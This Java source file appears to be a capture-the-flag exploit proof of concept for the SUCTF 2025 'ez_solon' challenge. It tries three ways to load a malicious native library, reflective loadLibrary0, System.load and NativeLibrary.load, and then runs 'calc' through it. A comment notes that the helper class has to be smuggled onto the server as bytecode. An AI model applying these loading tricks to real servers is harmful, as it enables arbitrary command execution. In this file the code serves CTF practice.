import java.io.File;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class Native_Caller {
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException {
        //加载方法1
//        File file = new File("D:\\BaiduSyncdisk\\ctf-challenges\\1diot9\\java-challenges\\SUCTF\\suctf2025\\ez_solon\\src\\main\\java\\poc.jnilib");
//        Method method = ClassLoader.class.getDeclaredMethod("loadLibrary0", Class.class, File.class);
//        method.setAccessible(true);
        //这个Native.class一般不会存在于服务器，需要我们通过字节码去加载
//        method.invoke(Thread.currentThread().getContextClassLoader(), Native.class, file);

        //加载方法2
        System.load("D:\\BaiduSyncdisk\\ctf-challenges\\1diot9\\java-challenges\\SUCTF\\suctf2025\\ez_solon\\src\\main\\java\\poc.jnilib");

        //加载方法3，失败
//        Class<?> aClass = Class.forName("java.lang.ClassLoader$NativeLibrary");
//        Method method1 = aClass.getDeclaredMethod("load", String.class, boolean.class, boolean.class);
//        method1.setAccessible(true);
//        method1.invoke(null, file.getAbsolutePath(), false, false);

        Native aNative = new Native();
        aNative.exec("calc");
    }
}
